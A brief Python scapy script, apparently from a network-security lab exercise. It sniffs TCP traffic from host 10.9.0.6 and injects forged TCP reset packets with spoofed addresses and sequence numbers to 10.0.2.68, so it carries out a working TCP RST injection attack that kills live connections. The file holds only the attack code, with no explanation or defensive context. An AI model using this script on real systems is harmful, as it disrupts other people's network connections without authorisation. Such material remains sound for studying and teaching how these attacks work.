#!/usr/bin/python3
from scapy.all import *
def spoof_tcp(pkt):
    IPLayer = IP(dst="10.0.2.68", src=pkt[IP].dst)
    TCPLayer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack)
    spoofpkt = IPLayer/TCPLayer
    send(spoofpkt, verbose=0)
pkt = sniff(filter='tcp and src host 10.9.0.6', prn=spoof_tcp)